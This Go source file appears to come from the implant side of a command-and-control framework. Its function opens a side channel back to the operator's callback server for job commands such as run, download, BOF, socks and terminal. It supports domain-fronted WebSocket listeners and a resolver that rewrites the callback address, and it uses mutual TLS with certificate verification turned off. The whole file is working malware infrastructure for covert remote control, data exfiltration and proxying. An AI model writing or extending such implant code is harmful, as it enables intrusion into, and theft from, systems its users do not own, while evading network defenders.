package main

import (
	"crypto/tls"
	"crypto/x509"
	"errors"
	"net"
	"strings"
)

// dialJobConn opens the side connection that job-based commands (run, download,
// BOF, socks, terminal) use to stream results. It mirrors the main connect
// loop: resolve the callback through the chain-domain resolver first, then use
// the same transport the primary session used (wss:// or raw TCP/TLS).
//
// Without this, every job command dialed profile.Addresses[0] verbatim, which
// breaks whenever the callback is a WebSocket URL (domain-fronted listener):
// the dial went to "wss://..." as if it were host:port and failed with
// "lookup ...: unknown port".
func dialJobConn() (net.Conn, error) {
	if len(profile.Addresses) == 0 {
		return nil, errors.New("no callback address in profile")
	}

	addr := profile.Addresses[0]
	if activeResolver != nil {
		addr = activeResolver.Rewrite(addr)
	}

	if strings.HasPrefix(addr, "wss://") || strings.HasPrefix(addr, "ws://") {
		return dialWebSocket(addr)
	}

	if !profile.UseSSL {
		return net.Dial("tcp4", addr)
	}

	cert, err := tls.X509KeyPair(profile.SslCert, profile.SslKey)
	if err != nil {
		return nil, err
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(profile.CaCert)

	config := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		InsecureSkipVerify: true,
	}

	return tls.Dial("tcp4", addr, config)
}
